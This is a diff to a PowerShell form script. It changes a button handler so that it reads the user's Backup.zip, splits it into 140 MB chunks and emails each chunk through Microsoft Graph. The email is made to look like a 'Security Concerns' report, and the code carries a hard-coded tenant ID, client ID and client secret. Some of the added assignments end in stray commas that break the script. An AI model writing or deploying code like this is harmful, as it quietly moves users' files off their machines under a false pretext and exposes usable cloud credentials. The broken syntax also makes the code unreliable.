@@ -70,57 +70,63 @@ $button.Add_Click({
     $tenantId    = "aff8a746-8efb-4a47-879d-9b13c505ea01"
     $clientId    = "901c8ca6-c038-4a84-805f-77b1863aecca"
     $clientSecret= "~5V8Q~_LVkiDCMfDOoHkaQ-_Yezuw3meW5T0pb5g"
-    $scope       = "https://graph.microsoft.com/.default"
-    $tokenUrl    = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
+    $SenderMailbox = "maxtest@netsmartinc.com",  # Mailbox allowed by ApplicationAccessPolicy
+    $Recipient = "mfisher@netsmartinc.com",
+    $Subject = "Security Concerns",
+    $BodyText = "Hello Security Team, please address the attached potential issue found.",
+    $FilePath = "C:\\Users\\$env:USERNAME\\Backup.zip",
+    $ChunkSizeMB = 140  # Keep chunks under 150 MB
+    $ChunkSizeBytes = $ChunkSizeMB * 1MB
+    $TokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
 
-    # Get OAuth token
-    $body = @{
-        client_id     = $clientId
-        scope         = $scope
-        client_secret = $clientSecret
+    $Body = @{
+        client_id     = $ClientId
+        scope         = "https://graph.microsoft.com/.default"
+        client_secret = $ClientSecret
         grant_type    = "client_credentials"
     }
 
-    $tokenResponse = Invoke-RestMethod -Uri $tokenUrl -Method POST -Body $body
-    $token = $tokenResponse.access_token
+    $TokenResponse = Invoke-RestMethod -Uri $TokenUrl -Method POST -Body $Body
+    $Token = $TokenResponse.access_token
+    Write-Host "Splitting file into chunks of $ChunkSizeMB MB..."
+    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+    $TotalSize = $FileBytes.Length
+    $ChunkCount = [math]::Ceiling($TotalSize / $ChunkSizeBytes)
 
-    # Prepare email
-    $senderMailbox = "maxtest@netsmartinc.com"
-    $recipient = "mfisher@netsmartinc.com"
-    $subject   = "Security Concerns"
-    $bodyText  = "Hello Security Team, please address the attached potential issue found."
-    $filePath  = "C:\Users\$env:USERNAME\Backup.zip"
+    $ChunksDir = Join-Path (Split-Path $FilePath) "Chunks"
+    if (-Not (Test-Path $ChunksDir)) { New-Item -ItemType Directory -Path $ChunksDir | Out-Null }
 
-    # Read file and convert to Base64
-    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
-    $fileName = [System.IO.Path]::GetFileName($filePath)
+for ($i = 0; $i -lt $ChunkCount; $i++) {
+    $StartIndex = $i * $ChunkSizeBytes
+    $EndIndex = [math]::Min($StartIndex + $ChunkSizeBytes, $TotalSize)
+    $Length = $EndIndex - $StartIndex
+    $ChunkData = $FileBytes[$StartIndex..($EndIndex-1)]
+    $ChunkPath = Join-Path $ChunksDir ("Chunk_$($i+1).part")
+    [System.IO.File]::WriteAllBytes($ChunkPath, $ChunkData)
+}
 
-    # Email payload
-    $emailPayload = @{
+$Headers = @{ "Authorization" = "Bearer $Token"; "Content-Type" = "application/json" }
+
+for ($i = 0; $i -lt $ChunkCount; $i++) {
+    $ChunkPath = Join-Path $ChunksDir ("Chunk_$($i+1).part")
+    $ChunkBytes = [System.IO.File]::ReadAllBytes($ChunkPath)
+    $ChunkBase64 = [System.Convert]::ToBase64String($ChunkBytes)
+    $ChunkName = [System.IO.Path]::GetFileName($ChunkPath)
+
+    $EmailPayload = @{
         message = @{
-            subject = $subject
-            body = @{
-                contentType = "Text"
-                content     = $bodyText
-            }
-            toRecipients = @(@{ emailAddress = @{ address = $recipient } })
-            attachments = @(@{
-                "@odata.type" = "#microsoft.graph.fileAttachment"
-                name          = $fileName
-                contentBytes  = $fileBase64
-            })
+            subject = "$Subject - Part $($i+1) of $ChunkCount"
+            body = @{ contentType = "Text"; content = "$BodyText (Part $($i+1) of $ChunkCount)" }
+            toRecipients = @(@{ emailAddress = @{ address = $Recipient } })
+            attachments = @(@{ "@odata.type" = "#microsoft.graph.fileAttachment"; name = $ChunkName; contentBytes = $ChunkBase64 })
         }
         saveToSentItems = $true
     } | ConvertTo-Json -Depth 10
 
-    # Send email
-    $headers = @{
-        "Authorization" = "Bearer $token"
-        "Content-Type"  = "application/json"
-    }
+    Write-Host "Sending chunk $($i+1) of $ChunkCount..."
+    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$SenderMailbox/sendMail" -Headers $Headers -Method POST -Body $EmailPayload
+}
 
-    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$senderMailbox/sendMail" -Headers $headers -Method POST -Body $EmailPayload
     $form.Close()
 })
 $form.Controls.Add($button)
